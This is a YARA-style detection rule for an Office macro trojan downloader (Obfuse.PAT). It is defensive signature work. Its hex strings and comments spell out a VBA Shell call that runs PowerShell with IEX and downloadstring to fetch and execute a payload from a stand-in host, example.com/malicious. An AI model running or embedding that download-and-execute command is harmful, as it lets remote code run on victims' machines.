
rule TrojanDownloader_O97M_Obfuse_PAT_MTB{
	meta:
		description = "TrojanDownloader:O97M/Obfuse.PAT!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {4d 73 67 42 6f 78 20 22 4d 61 63 72 6f 20 70 6f 70 70 69 6e 67 20 50 6f 77 65 72 73 68 65 6c 6c 21 22 2c 20 76 62 4f 4b 4f 6e 6c 79 2c 20 22 67 61 6d 65 20 6f 76 65 72 } //1 MsgBox "Macro popping Powershell!", vbOKOnly, "game over
		$a_01_1 = {53 68 65 6c 6c 28 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 2d 6e 6f 65 78 69 74 20 2d 43 6f 6d 6d 61 6e 64 20 22 22 49 45 58 20 28 28 6e 65 77 2d 6f 62 6a 65 63 74 20 6e 65 74 2e 77 65 62 63 6c 69 65 6e 74 29 2e 64 6f 77 6e 6c 6f 61 64 73 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 65 78 61 6d 70 6c 65 2e 63 6f 6d 2f 6d 61 6c 69 63 69 6f 75 73 2f 70 61 79 6c 6f 61 64 2e 65 78 65 27 29 29 22 22 22 2c 20 31 29 } //1 Shell("powershell.exe -noexit -Command ""IEX ((new-object net.webclient).downloadstring('http://example.com/malicious/payload.exe'))""", 1)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}